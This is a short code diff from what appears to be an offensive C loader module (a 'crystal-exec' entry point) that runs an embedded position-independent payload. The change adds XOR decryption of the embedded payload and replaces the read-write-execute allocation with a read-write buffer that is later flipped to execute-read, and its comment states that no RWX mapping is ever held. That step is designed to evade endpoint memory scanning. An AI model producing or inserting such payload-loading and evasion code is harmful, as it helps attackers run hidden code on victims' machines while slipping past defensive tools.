@@ -155,13 +155,24 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
 
     void *pico_mem = VirtualAlloc(NULL, (SIZE_T)crystalexec_pico_len,
                                   MEM_COMMIT | MEM_RESERVE,
-                                  PAGE_EXECUTE_READWRITE);
+                                  PAGE_READWRITE);
     if (!pico_mem) {
         VirtualFree(args_buf, 0, MEM_RELEASE);
         CloseHandle(hRead); CloseHandle(hWrite);
         FAIL("VirtualAlloc(pico) failed");
     }
-    memcpy(pico_mem, crystalexec_pico, crystalexec_pico_len);
+    /* XOR-decrypt embedded PICO into RW region */
+    unsigned char *dst = (unsigned char *)pico_mem;
+    for (DWORD i = 0; i < crystalexec_pico_len; i++)
+        dst[i] = crystalexec_pico[i] ^ crystalexec_pico_key[i % crystalexec_pico_key_len];
+    /* Flip RW → RX; no RWX mapping ever held */
+    DWORD old_prot;
+    if (!VirtualProtect(pico_mem, crystalexec_pico_len, PAGE_EXECUTE_READ, &old_prot)) {
+        VirtualFree(pico_mem,  0, MEM_RELEASE);
+        VirtualFree(args_buf, 0, MEM_RELEASE);
+        CloseHandle(hRead); CloseHandle(hWrite);
+        FAIL("VirtualProtect(pico) failed");
+    }
 
     ob_printf(&ob, "[crystal-exec] PICO size: %u bytes\n", crystalexec_pico_len);
 
